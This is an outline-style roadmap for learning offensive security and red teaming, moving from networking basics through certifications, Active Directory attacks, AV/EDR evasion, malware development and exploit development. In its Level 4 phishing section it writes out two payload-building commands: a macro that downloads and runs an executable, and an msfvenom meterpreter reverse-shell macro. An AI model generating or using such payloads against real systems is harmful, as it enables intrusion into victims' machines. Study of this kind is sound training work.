https://www.youtube.com/watch?v=XvUFd71HljE


# Basics
- Programming, Networking, OS
	- Programming
		- python/perl/ruby
		- c/c++/c#
	- Operating System
		- Windows
			- Windows Server 2016 (MCSA)
				- Domain Controller
					- trees
					- forest
					- trust
				- AD objects
					- users
					- printers
					- computer
					- group
					- servers
				- Accounts
					- local user
					- admin
					- guest
					- system
				- AD accounts
					- admin
					- guest
					- krbtgt
				- credential authenticator
					- nt hash
					- lm hash
					- ntlm auth process
					- cred storage
						- sam db
						- lsass process memory
				- process token
				- 
			- cmd
			- windows internal
		- Linux
	- Networking
		- CCNA 200/301
			- Routing/Switching
			- TCP/IP and Internet Protocol
			- VLAN/ Subnetting
			- Networking Security Concept
				- ACL
				- DHCP Spoofing
				- Port Security
				- Wireshark


# Level 1
- EJPT
	- Subdomain enum
		- sublister
		- dnsdumpster
	- footprinting and scanning
		- masscan
		- nmap
	- vuln assessment
		- searchploit
		- exploitdb
		- nessus
	- some vuln
		- sql injection
		- xss
		- smb null attack
- OSCP and eCPPTv2
	- OSCP
		- penetration testing: what you should know
		- getting comfortable with kali linux
		- command line fun
		- practical tools
		- bash scripting
		- passive info gathering
		- active info gathering
		- vuln scanning
		- web app attacks
		- intro to buffer overflows
		- win buffer overflows
		- linux buffer overflows
		- client-side attacks
		- locating public exploits
		- fixing exploits
		- file transfers
		- antivirus evasion
		- privs esc
		- pass attacks
		- port redirection and tunneling
		- AD attacks
		- the metasploit framework
		- powershell empire
	- eCPPTv2
		- fund of buffer overflows
		- cryptography and pass cracking
		- fund of netwokring sec - recon, spoofing, post-exp, and social engr
		- linux and win exploit and privs esc
		- basic of web sec - recon, xss, sqli
		- wifi sec attacks
- CTF
	- tryhackme
	- hackthebox


# Level 2
- Post exploitation (LOTL)
	- internal info gath
	- privs esc
	- persistence
		- com hijacking
		- startup folder
		- backdoor as service
		- local user acc
		- dll injection
- tcm sec/hackersploit, pentester acad






# Level 3
- CRTP/CRTPE (Pentester acad courses) and AD attacks and lateral movement (tcm sec courses)
	- stolen credentials
	- lateral movement
		- dumping hashes
			- psexec
			- wmi
			- dcom
			- psremoting
		- crackmapexec
		- pass the hash/pass
			- dumping hashes with secretsdump
			- hashcat
			- crackmapexec
		- token impersonation
	- attacks
		- local net attacks: llmnr and nbt-ns poisoning
		- smb relay 
		- ipv6 attack (fake dhcp server)
		- kerberos delegation attacks
		- spoofing ssdp and UPnP devices with EvilSSDP
	- post compromise enumeration
		- powerview
		- bloodhound
		- enum4linux
		- crackmapexec



# Level 4
- OSEP/PTX
	- phishing assessment
		- client side attacks
			- html smuggling
			- win script host
				- vbs
				- jscript
			- microsoft off
				- vba
				- dde
				- macro_pack
				- luckystrike
				- unicorn
					- python windows/download_exec url=https://192.168.122.32:8080/test.exe macro
				- metasploit
					- msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x.x.x.x -f -vba-psh

			- dotnettojscript
			- 
		- email sec
			- sender policy framework
			- bypass anti-spam
			- dkim verifying message content
	- defensive evasion
		- bypass amsi
		- bypass av
			- sections shellcode process injector (C#)
			- shellcode process hollowing (C#)
			- shellcode process injector (C# and PSI)
		- bypass app whitelisintg
		- bypass win applocker
	- priv esc, Lat Mov, AD


# Level 5
- Book 1: Red team development and operation (sans sec564 red team opeartion)
	- Engagement Planning
		- roles and responsibilities
		- rules of engagement (ROE)
		- thread planning
	- Engagement Execution
		- execution's concept
		- c2 server
	- Engagement culmination
	- Engagement reporting
- Book 2: hands on red team tactics - a practical guide to mastering red team (red team practices with c2 server)


# Level 6
- before sektor 7 courses i highly recommend to read this books:
	- book 1: malware analysis and detection engineering
	- book 2: learning malware analysis - explore concepts, tools, and techniques
- sektor7 about red team and malware development
	- process and code injection
	- dll / reflected dll injection
	- write your own dropper
	- process unhooking
	- api hooking
	- module stomping / PPID spoof / command line spoof
		- detected debuggers / dynamic analysis sandboxes
		- anti-static & api hashing


# Level 7
- cobalt strike courses: raphael mudge cobalt strike red team course
	- https://www.youtube.com/@DashnineMedia/playlists


# Level 8
- zeropointsecurity course red team OPS I and II
	- RTO I
		- C2
		- initial compromise
		- host recon
		- host persistence
		- host priv esc
		- a lot of things
	- RTO II
		- defensive evasion
		- edr evasion
		- c2 infrastructure
		- process injection


# Level 9
- exploit dev
	- exploits shellcode handbook
	- gray hat book
	- the hacking art of exploit book
	- OSED  course


# Level 10
- read sparc flow books "how to hack like a legend & how to hack like a pornstar"